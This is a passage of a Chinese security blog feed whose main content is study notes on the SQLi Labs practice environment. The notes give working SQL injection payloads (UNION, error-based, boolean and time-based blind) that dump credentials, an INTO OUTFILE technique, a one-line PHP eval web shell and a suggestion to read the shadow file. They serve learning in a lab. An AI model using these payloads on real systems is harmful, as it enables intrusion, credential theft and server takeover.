<p>反正我感觉这个题出的很漂亮！</p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Preface&quot;&gt;&lt;a href=&quot;#Preface&quot; class=&quot;headerlink&quot; title=&quot;Preface&quot;&gt;&lt;/a&gt;Preface&lt;/h1&gt;&lt;p&gt;这是一道脑洞比较大的题，反正我是没做出来，看了各位大神的解答之后理清了一遍思路才搞定的，来自7月&lt;a href=&quot;&quot;&gt;X-NUCA全国高校网安联赛&lt;/a&gt;的指导题目21，题目链接&lt;a href=&quot;http://218.76.35.75:20106&quot;&gt;http://218.76.35.75:20106&lt;/a&gt;，不知道合天会不会一直挂着题目。然而这次的&lt;a href=&quot;http://www.ichunqiu.com/racing/ctf_54791&quot;&gt;“百度杯”CTF比赛&lt;/a&gt;又出现了，很有意思。&lt;br&gt;
    
    </summary>
    
      <category term="CTF Writeups" scheme="http://ug1y.github.io/categories/CTF-Writeups/"/>
    
    
      <category term="X-NUCA" scheme="http://ug1y.github.io/tags/X-NUCA/"/>
    
  </entry>
  
  <entry>
    <title>SQLi Labs 学习笔记 Part 4</title>
    <link href="http://ug1y.github.io/2016/09/06/SQLi-Labs-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Part-4/"/>
    <id>http://ug1y.github.io/2016/09/06/SQLi-Labs-学习笔记-Part-4/</id>
    <published>2016-09-06T12:49:28.000Z</published>
    <updated>2016-09-18T13:53:41.793Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第五课：布尔盲注"><a href="#第五课：布尔盲注" class="headerlink" title="第五课：布尔盲注"></a>第五课：布尔盲注</h1><p>在Less-8中，我们通过注入一些查询后，会发现并没有在屏幕上看到错误信息，因此也不能确定在这个网页上是否存在注入。这也是为什么这种类型的注入叫做盲注。通常有两种类型的盲注，基于布尔的和基于时间的。<br><a id="more"></a></p>
<p>首先，通过一系列尝试，得知注入<code>1&#39; or 1--+</code>是能够成功执行的。</p>
<p><img src="/images/sqli/sqli_20160906205727.png" alt=""></p>
<p>而条件为假时<code>1&#39; and 0--+</code>结果如下：</p>
<p><img src="/images/sqli/sqli_20160906210009.png" alt=""></p>
<p>通过两种不同条件下结果的差异，我们可以通过一些查询来猜测我们构造的一些语句的真假值。利用<code>length()</code>、<code>substr()</code>、<code>ascii()</code>等函数来猜测每一个字符。<br><code>1&#39; and ascii(substr(select database(),1,1))&gt;100--+</code></p>
<p><img src="/images/sqli/sqli_20160906210547.png" alt=""></p>
<p>反复尝试数值大小，就能得到特定位置的字符的ascii值，然后调整字符串截取函数的位置，猜测出整个字符串是什么。同样也可以用这种方法猜测出所有前面介绍的方法获取表、字段以及数据。<br><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100--+</code></p>
<h1 id="第六课：基于时间的盲注"><a href="#第六课：基于时间的盲注" class="headerlink" title="第六课：基于时间的盲注"></a>第六课：基于时间的盲注</h1><p>基于时间的盲注与布尔盲注本质是一样的，通过构造特殊的注入使得产生不同的结果，然后判断条件的真假。例如：<br><code>1&#39; and if((select database()) like &#39;s%&#39;,sleep(5),null)--+</code></p>
<p>若条件正确，则会执行后面的<code>sleep()</code>函数，所以表现的状态是浏览器不会立即得到响应，而是需要等待一段时间，所等待的时间则是sql语句查询时执行休眠函数的时间。其他查询例如：<br><code>1&#39; and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#39;e&#39;,sleep(5),null)--+</code></p>
<p>盲注需要大量的测试用例去猜测正确的结果，往往需要编写一些脚本来实现，实际运用中，大可以使用工具来辅助我们完成，SQL注入神器<a href="http://sqlmap.org/" target="_blank" rel="external">sqlmap</a>，用python编写，简单实用，能检测许多的sql注入点并且帮助完成爆库的工作。</p>
<h1 id="第七课：导出数据库至文件"><a href="#第七课：导出数据库至文件" class="headerlink" title="第七课：导出数据库至文件"></a>第七课：导出数据库至文件</h1><p>mysql中有关键字<code>outfile</code>能将输出的结果导入至文件，同时<code>dumpfile</code>能将一行结果导入至文件，利用这个特性，可以构造语句使得虽然无法利用页面获得信息，但可以写入文件并用网页访问该文件。</p>
<p>首先打开Less7，还是一样的办法，构造能够注入的语句，加上单引号、双引号、反斜杠、括号、注释等，找到可以用于注入的语句，发现<code>id=1&#39;)) --+</code>可以注入，其他都仅显示语法错误。</p>
<p><img src="/images/sqli/sqli_20160918211612.png" alt=""></p>
<p>在mysql控制台中，使用文件导出语句，导出sql查询的内容。（因为在windows下，所以要用双斜杠表示一级目录）<br><code>select * from users into outfile &quot;C:\\wamp64\\www\\test\\test.txt&quot;</code></p>
<p><img src="/images/sqli/sqli_20160918212035.png" alt=""></p>
<p>可得到该文件在指定目录中的内容，需要注意的是如果指定文件路径存在，则无法覆盖文件会报错无法导出。</p>
<p><img src="/images/sqli/sqli_20160918212507.png" alt=""></p>
<p>另外，还可以用函数<code>load_file()</code>读取文件内容并导出结果至指定文件中，可以想象如果是linux系统就可以利用这种方法导出<code>shadow</code>文件获取系统账号密码。</p>
<p><img src="/images/sqli/sqli_20160918213059.png" alt=""></p>
<p>于是，当我们知道了服务器目录时，可以将查询结果导入至可访问的绝对路径下，然后通过访问则可获取该数据库的内容，同时也可以构造例如<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>这样的一句话shell来控制和攻击目标主机。</p>
<p><code>1&#39;)) union select 1,2,3 into outfile &quot;C:\\wamp64\\www\\test\\union.txt&quot; --+</code><br><img src="/images/sqli/sqli_20160918214004.png" alt=""></p>
<p><code>-1&#39;)) union select &quot;&quot;,&quot;hello&quot;,&quot;&lt;b&gt;world&lt;/b&gt;&quot; into outfile &quot;C:\\wamp64\\www\\test\\hello.php&quot; --+</code><br><img src="/images/sqli/sqli_20160918214855.png" alt=""></p>
<p>其他的包括前面文章中提到的爆库方法中的查询语句都可以用于此处将查询结果导入至文件然后访问获取。另外，将<code>outfile</code>换成<code>dumpfile</code>也可以导入至文件，但是<code>dumpfile</code>一次只能导入一行结果，即每次查询结果只能有一行才可以用该关键字。</p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;第五课：布尔盲注&quot;&gt;&lt;a href=&quot;#第五课：布尔盲注&quot; class=&quot;headerlink&quot; title=&quot;第五课：布尔盲注&quot;&gt;&lt;/a&gt;第五课：布尔盲注&lt;/h1&gt;&lt;p&gt;在Less-8中，我们通过注入一些查询后，会发现并没有在屏幕上看到错误信息，因此也不能确定在这个网页上是否存在注入。这也是为什么这种类型的注入叫做盲注。通常有两种类型的盲注，基于布尔的和基于时间的。&lt;br&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://ug1y.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQLi Labs" scheme="http://ug1y.github.io/tags/SQLi-Labs/"/>
    
  </entry>
  
  <entry>
    <title>SQLi Labs 学习笔记 Part 3</title>
    <link href="http://ug1y.github.io/2016/09/05/SQLi-Labs-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Part-3/"/>
    <id>http://ug1y.github.io/2016/09/05/SQLi-Labs-学习笔记-Part-3/</id>
    <published>2016-09-05T13:42:28.000Z</published>
    <updated>2016-09-07T13:51:08.201Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第四课：基于错误的SQL注入"><a href="#第四课：基于错误的SQL注入" class="headerlink" title="第四课：基于错误的SQL注入"></a>第四课：基于错误的SQL注入</h1><p>上一部分，已经初步了解了什么是SQL注入，程序获取用户的输入然后进行SQL查询，但是没有对用户的输入做任何过滤，导致用户构造一些意料之外的输入使得原先的sql语句发生了变化，如插入条件判断、注释后面的语句等。我们通过一些最基础的方法构造注入语句查询我们想要得到的信息，攻击目标主机，下面将介绍再其他复杂情况下构造SQL注入语句的一些方法。<br><a id="more"></a></p>
<p>在Less-5中，对参数<code>id</code>输入整数，都返回<code>You are in...........</code>，这意味着，无法通过上一部分的所讲的方法构造联合查询来爆出数据库的表内容了。</p>
<p><img src="/images/sqli/sqli_20160905222437.png" alt=""></p>
<p>还是同样的方法，输入一些特殊字符让其产生错误，看是否会返回错误信息</p>
<ul>
<li><code>?id=1&#39;</code></li>
<li><code>?id=1&quot;</code></li>
<li><code>?id=1\</code></li>
</ul>
<p><img src="/images/sqli/sqli_20160905223120.png" alt=""></p>
<p>打印出了错误信息，同时，根据错误来推测sql语句大概是怎样写的，Less-5中返回的错误能得知参数<code>id</code>是用单引号包裹着的，于是构造一些能正确输出的注入语句，能够执行我们的恶意代码，如<code>?id=1&#39; or 1--+</code>等。</p>
<p>这样情况下的注入，有一种方法叫做<strong>基于错误的SQL注入</strong>，接下来讨论如何利用错误信息让后端爆出数据库表的内容。我们考虑如下几个函数<code>count()</code>、<code>rand()</code>、<code>floor()</code>（当然<code>round()</code>也是一样的），执行如下：</p>
<ul>
<li><code>select count(*) from information_schema.tables;</code></li>
<li><code>select floor(rand()*2);</code></li>
</ul>
<p><img src="/images/sqli/sqli_20160905225546.png" alt=""></p>
<p>这两个函数分开执行的时候都没有问题，但是和<code>group by</code>分组语句放在一起执行会出现错误，报错显示的内容出现重复的键，这里构造语句，执行几次之后会报错重复的分组键。<br><code>select count(*),floor(rand()*2)a from information_schema.tables group by a;</code></p>
<p><img src="/images/sqli/sqli_20160905225847.png" alt=""></p>
<p>利用这个特性，可以把想要查询的内容用函数<code>concat()</code>拼接起来，就可以报错我们想要得到的内容，比如导出当前数据库。<br><code>select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;</code></p>
<p><img src="/images/sqli/sqli_20160905230310.png" alt=""></p>
<p>同样的，还可以知道当前数据库版本信息，当前用户，以及当前数据库有哪些表等等。</p>
<ul>
<li><code>select count(*),concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;</code></li>
<li><code>select count(*),concat(0x3a,0x3a,user(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;</code></li>
<li><code>select count(*),concat(0x3a,0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;</code></li>
</ul>
<p><img src="/images/sqli/sqli_20160905231531.png" alt=""></p>
<p>接下来，我们要用这个特性来具体实施SQL注入，构造我们的注入语句，二话不说，直接用条件构造注入试试，出现这个错误，操作只能包含一个列。<br><code>1&#39; and (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)--+</code></p>
<p><img src="/images/sqli/sqli_20160905232220.png" alt=""></p>
<p>我们构造的语句一共含有两列，第一个是数数，第二个是我们要出错的注入语句。既然只能有一列，那就把这两列当作被查询的目标作为子查询插入。<br><code>1&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a))--+</code></p>
<p><img src="/images/sqli/sqli_20160905232713.png" alt=""></p>
<p>这个错误显示告诉我们，每一个衍生的标必须有一个别称，意思是我们的子查询缺少一个别称，随便加一个就行，在<code>a)</code>的后面，对整个子查询语句命名为b，最后得到我们想要的注入结果。<br><code>1&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b)--+</code></p>
<p><img src="/images/sqli/sqli_20160905233043.png" alt=""></p>
<p>ps：有时候可能会报出<code>Subquery returns more than 1 row</code>的错误，多点几次执行就能看到结果了。</p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;第四课：基于错误的SQL注入&quot;&gt;&lt;a href=&quot;#第四课：基于错误的SQL注入&quot; class=&quot;headerlink&quot; title=&quot;第四课：基于错误的SQL注入&quot;&gt;&lt;/a&gt;第四课：基于错误的SQL注入&lt;/h1&gt;&lt;p&gt;上一部分，已经初步了解了什么是SQL注入，程序获取用户的输入然后进行SQL查询，但是没有对用户的输入做任何过滤，导致用户构造一些意料之外的输入使得原先的sql语句发生了变化，如插入条件判断、注释后面的语句等。我们通过一些最基础的方法构造注入语句查询我们想要得到的信息，攻击目标主机，下面将介绍再其他复杂情况下构造SQL注入语句的一些方法。&lt;br&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://ug1y.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQLi Labs" scheme="http://ug1y.github.io/tags/SQLi-Labs/"/>
    
  </entry>
  
  <entry>
    <title>SQLi Labs 学习笔记 Part 2</title>
    <link href="http://ug1y.github.io/2016/09/03/SQLi-Labs-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Part-2/"/>
    <id>http://ug1y.github.io/2016/09/03/SQLi-Labs-学习笔记-Part-2/</id>
    <published>2016-09-03T04:27:10.000Z</published>
    <updated>2016-09-07T13:51:39.905Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一课：判断注入点"><a href="#第一课：判断注入点" class="headerlink" title="第一课：判断注入点"></a>第一课：判断注入点</h1><p>Less-1中通过输入参数<code>?id=1</code>能够看到获取的用户名密码的内容，改变id的值可以看到不同的用户名密码，在后端的实际查询如下：<br><code>select * from TABLE where id=1;</code><br><a id="more"></a></p>
<p>我们输入一些特殊符号，让其产生错误，如单引号‘’’，双引号‘“’，反斜杠‘\’等，我们构造参数<code>id=1\</code>,产生错误如下：</p>
<p><img src="/images/sqli/sqli_20160903123834.png" alt=""></p>
<p>可以知道输入的参数<code>$id</code>是被单引号包裹的，于是可以猜测其sql语句为：<br><code>$sql=&quot;select * from users where id=&#39;$id&#39; limit 0,1&quot;;</code></p>
<p>于是我们可以闭包前面的语句同时注释后面的语句来构造正确的查询。</p>
<ul>
<li><code>?id=1&#39;--+</code> //‘+’在浏览器url中会被解析成空格</li>
<li><code>?id=1&#39;%23</code> //‘%23’是‘#’的URL编码，用于注释后面的语句</li>
</ul>
<p>通过条件注入使得sql语句中where条件恒为真即达到目的。</p>
<ul>
<li><code>&#39; or &#39;1&#39;=&#39;1</code></li>
<li><code>&#39; or 1 --+</code></li>
<li><code>&#39; or 1 %23</code></li>
</ul>
<p>以上的注入会让sql查询等同于<code>select * from users</code></p>
<h1 id="第二课：基本的注入获取全局信息"><a href="#第二课：基本的注入获取全局信息" class="headerlink" title="第二课：基本的注入获取全局信息"></a>第二课：基本的注入获取全局信息</h1><p>从上节课能够知道，通过输入特殊字符使得报错，能够得知注入的构造方法，用or语句使得条件永为真。同样在Less-2、Less-3、Less-4我们去尝试构造得到如下结果：</p>
<ul>
<li>Less-2: <code>1 --+</code></li>
<li>Less-3: <code>1&#39;) --+</code></li>
<li>Less-4: <code>1&quot;) --+</code></li>
</ul>
<p>这意味着我们在<strong>注释语句</strong>和<strong>闭合语句</strong>之间可以加入任何我们想执行的恶意注入代码。</p>
<p>开始注入第一步，猜测sql查询的行数，在Less-1中构造注入<code>1&#39; order by 1--+</code>，按照第1行来排序，一直加，直到报错为止。发现当构造注入代码<code>1&#39; order by 4--+</code>时，出现错误，则说明总共查询有三行。</p>
<p><img src="/images/sqli/sqli_20160903131801.png" alt=""></p>
<p>接下来我们用联合查询，构造<code>1&#39; union select 1,2,3--+</code>，但是什么也没有发生，这是由于联合查询将查询结果直接添加到数组后面，然而我们页面只显示了第一行，所以我们将构造改成<code>999&#39; union select 1,2,3--+</code>得到如下：</p>
<p><img src="/images/sqli/sqli_20160903131016.png" alt=""></p>
<p>接下来，根据其显示输出的位置，我们构造注入代码添加想要查看的一些信息</p>
<ul>
<li><code>-1&#39; union select 1,version(),3--+</code> //查看数据库版本</li>
<li><code>-1&#39; union select 1,database(),3--+</code> //查看当前数据库名</li>
<li><code>-1&#39; union select 1,user(),3--+</code> //查看当前用户</li>
<li><code>-1&#39; union select 1,@@datadir,3--+</code> //查看全局变量，数据存储目录</li>
</ul>
<h1 id="第三课：构造注入获取数据库或表内容"><a href="#第三课：构造注入获取数据库或表内容" class="headerlink" title="第三课：构造注入获取数据库或表内容"></a>第三课：构造注入获取数据库或表内容</h1><p>MYSQL的数据库中有一个自带的数据库information_schema，它提供了访问数据库元数据的方式。元数据就是对数据的描述，如数据库名或表名，列的数据类型，或访问权限等。普通的用户一般来说是可以有select等权限查看里面的内容。其中tables、columns等表存储着一些重要的信息。</p>
<p><img src="/images/sqli/sqli_20160903215717.png" alt=""></p>
<p>接下来，我们构造一些注入来获取一些有用的信息。<br><code>-1&#39; union select 1,database(),3--+</code></p>
<p><img src="/images/sqli/sqli_20160903220456.png" alt=""></p>
<p>得知当前数据库是<code>security</code>，利用元数据中的<code>tables</code>表来获取当前数据中有哪些表。<br><code>-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
<p><img src="/images/sqli/sqli_20160903220951.png" alt=""></p>
<p>同样，用函数<code>database()</code>替换字符串<code>security</code>也能达到同样的效果。另外，可以使用<code>limit</code>关键字来指定获取第几行的数据，第一个参数是行数，第二个参数是偏移量。<br><code>-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1--+</code></p>
<p><img src="/images/sqli/sqli_20160903221300.png" alt=""></p>
<p>如果想要一次全显示出来，可以用函数<code>group_concat</code>字符串组拼接。<br><code>-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</code></p>
<p><img src="/images/sqli/sqli_20160903221831.png" alt=""></p>
<p>还可以利用这种方法获取表的字段信息，例如<code>users</code>表包含哪些字段，其他的表也一样。<br><code>-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
<p><img src="/images/sqli/sqli_20160903222700.png" alt=""></p>
<p>最后，如果要导出表内容，通过以上获取的表名及其相应的字段信息，直接构造sql查询即可。<br><code>-1&#39; union select 1,group_concat(username),group_concat(password) from users--+</code></p>
<p><img src="/images/sqli/sqli_20160903223146.png" alt=""></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;第一课：判断注入点&quot;&gt;&lt;a href=&quot;#第一课：判断注入点&quot; class=&quot;headerlink&quot; title=&quot;第一课：判断注入点&quot;&gt;&lt;/a&gt;第一课：判断注入点&lt;/h1&gt;&lt;p&gt;Less-1中通过输入参数&lt;code&gt;?id=1&lt;/code&gt;能够看到获取的用户名密码的内容，改变id的值可以看到不同的用户名密码，在后端的实际查询如下：&lt;br&gt;&lt;code&gt;select * from TABLE where id=1;&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://ug1y.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQLi Labs" scheme="http://ug1y.github.io/tags/SQLi-Labs/"/>
    
  </entry>
  
  <entry>
    <title>SQLi Labs 学习笔记 Part 1</title>
    <link href="http://ug1y.github.io/2016/09/03/SQLi-Labs-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Part-1/"/>
    <id>http://ug1y.github.io/2016/09/03/SQLi-Labs-学习笔记-Part-1/</id>
    <published>2016-09-03T02:32:28.000Z</published>
    <updated>2016-09-07T13:52:25.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在知乎上搜的<a href="https://www.zhihu.com/question/30505597" target="_blank" rel="external">如何做CTF训练</a>时，看到各种大神的心路历程，十分激动，刚开始学习，对于SQL注入感觉很有意思，便从大神们推荐的网站开始入手。SQLi Labs是一外国友人写的一套简单易入门的教程，实验环境发布至<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">github</a>上，视频教程我已经从youtube下载分享至百度云盘上，链接<a href="https://yun.baidu.com/s/1kVJcsyr" target="_blank" rel="external">https://yun.baidu.com/s/1kVJcsyr</a>，有需要的可以拿去不谢。</p>
<a id="more"></a>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ol>
<li>从<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a>上下载源代码</li>
</ol>
<p><img src="/images/sqli/sqli_37784a27.png" alt=""></p>
<ol>
<li>解压至Apache webroot目录下，我用的是<a href="http://www.wampserver.com/" target="_blank" rel="external">wampserver</a>，复制到www目录下</li>
</ol>
<p><img src="/images/sqli/sqli_9455b9b1.png" alt=""></p>
<ol>
<li>打开<code>sql-connections</code>目录下的<code>db-creds.inc</code>文件，修改mysql用户名、密码和主机</li>
</ol>
<p><img src="/images/sqli/sqli_225b1732.png" alt=""></p>
<ol>
<li>打开浏览器，访问<a href="http://localhost/sqli-labs/" target="_blank" rel="external">http://localhost/sqli-labs/</a>,点击<code>Setup/reset Database for labs</code>链接会自动为你初始化数据库</li>
</ol>
<p><img src="/images/sqli/sqli_ac79751f.png" alt=""></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>网上也有关于这个这个实验环境的通关攻略，我借鉴别人的翻译结合自己看视频的过程把学习笔记记下来，方便查阅。实验环境总共分了4页，从基础到复杂的，视频资源也是最多到第2页就没有了，学习了这些基本能掌握常用的SQL注入的一些实例，能够进阶理解更复杂多变的注入方法</p>
<p><img src="/images/sqli/sqli_e4f15294.png" alt=""></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在知乎上搜的&lt;a href=&quot;https://www.zhihu.com/question/30505597&quot;&gt;如何做CTF训练&lt;/a&gt;时，看到各种大神的心路历程，十分激动，刚开始学习，对于SQL注入感觉很有意思，便从大神们推荐的网站开始入手。SQLi Labs是一外国友人写的一套简单易入门的教程，实验环境发布至&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;github&lt;/a&gt;上，视频教程我已经从youtube下载分享至百度云盘上，链接&lt;a href=&quot;https://yun.baidu.com/s/1kVJcsyr&quot;&gt;https://yun.baidu.com/s/1kVJcsyr&lt;/a&gt;，有需要的可以拿去不谢。&lt;/p&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://ug1y.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQLi Labs" scheme="http://ug1y.github.io/tags/SQLi-Labs/"/>
    
  </entry>
  
  <entry>
    <title>方便实用的字符串编码网站</title>
    <link href="http://ug1y.github.io/2016/09/03/%E6%96%B9%E4%BE%BF%E5%AE%9E%E7%94%A8%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BC%96%E7%A0%81%E7%BD%91%E7%AB%99/"/>
    <id>http://ug1y.github.io/2016/09/03/方便实用的字符串编码网站/</id>
    <published>2016-09-03T02:12:23.000Z</published>
    <updated>2016-09-05T15:39:00.102Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/d75159a908c9dd36930cdf9c86189954.png" alt=""></p>
<a id="more"></a>
<p>在进行网站测试时，经常会碰到编码绕过等问题，例如HTML编码、URL编码、base64编码，甚至还有其他像MD5、SHA1等哈希值的计算。其他的包括一些代码的混淆，SQL字符转换、Javascript等。推荐一个网站，也是我不经意看到的，可以直接访问主页<a href="https://encoder.mattiasgeniar.be/" target="_blank" rel="external">Decode, Encode or Obfuscate your string</a>使用，也可以下载<a href="https://github.com/mattiasgeniar/Encoder" target="_blank" rel="external">github</a>上的源码至本地服务器上使用</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/images/d75159a908c9dd36930cdf9c86189954.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="实用工具" scheme="http://ug1y.github.io/categories/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Encoder" scheme="http://ug1y.github.io/tags/Encoder/"/>
    
  </entry>
  
  <entry>
    <title>好用必备的web调试工具</title>
    <link href="http://ug1y.github.io/2016/09/01/%E5%A5%BD%E7%94%A8%E5%BF%85%E5%A4%87%E7%9A%84web%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    <id>http://ug1y.github.io/2016/09/01/好用必备的web调试工具/</id>
    <published>2016-09-01T02:46:11.000Z</published>
    <updated>2016-09-05T15:39:34.234Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不管是程序员还是搞网络安全的，一个好用上手的工具当时是十分必要的，在做一些CTF赛题和开发的过程中，经常需要用到web调试，最好用的还是<a href="http://www.firefox.com.cn/" target="_blank" rel="external">火狐浏览器</a>了，支持插件多，定制功能强，下面介绍两个好用的插件，可以点击浏览器的<a href="https://addons.mozilla.org/zh-CN/firefox/" target="_blank" rel="external">附加组件</a>查找更多搜索安装<br><a id="more"></a></p>
<h2 id="firebug"><a href="#firebug" class="headerlink" title="firebug"></a>firebug</h2><p>支持直接修改、删除、新建cookie，用这个来操作cookie真的很方便<br><img src="/images/60cf5893ced82b57900e7f65ec3cf07b.png" alt=""></p>
<p>修改和新建cookie时要注意存活时间，在当前时间之后即是创建，之前则是删除<br><img src="/images/167003185f5ac39ce427c83f327bdf47.png" alt=""></p>
<h2 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h2><p>另一个用于调试的神奇插件，可以载入URL并且点击Execute按钮可以直接执行http请求，在这个框里修改请求参数，比如写个注入啥的，用于测试很是方便<br><img src="/images/78470a3e072dc8da5980ca5375d804bf.png" alt=""></p>
<p>选中Enable Post data还可以修改表单数据提交请求，Referrer就更不用说了<br><img src="/images/6a3749189981a487c591b8f82cfecff9.png" alt=""></p>
<p>注意到上面那一排下拉框了吧，都是一些便捷的小工具，比如Encoding里面，选中文本可以base64编码、URL编码、16进制转换<br><img src="/images/bd12d2a6e004b3aedd4afa5850b4c254.png" alt=""></p>
<p>其他的包括SQL、XSS、Encryption和Other都是一些常见的编码、加密或者字符串处理，十分方便实用</p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;不管是程序员还是搞网络安全的，一个好用上手的工具当时是十分必要的，在做一些CTF赛题和开发的过程中，经常需要用到web调试，最好用的还是&lt;a href=&quot;http://www.firefox.com.cn/&quot;&gt;火狐浏览器&lt;/a&gt;了，支持插件多，定制功能强，下面介绍两个好用的插件，可以点击浏览器的&lt;a href=&quot;https://addons.mozilla.org/zh-CN/firefox/&quot;&gt;附加组件&lt;/a&gt;查找更多搜索安装&lt;br&gt;
    
    </summary>
    
      <category term="实用工具" scheme="http://ug1y.github.io/categories/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="debug" scheme="http://ug1y.github.io/tags/debug/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://ug1y.github.io/2016/08/22/hello-world/"/>
    <id>http://ug1y.github.io/2016/08/22/hello-world/</id>
    <published>2016-08-22T06:24:55.008Z</published>
    <updated>2016-08-23T01:12:24.673Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<a id="more"></a>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
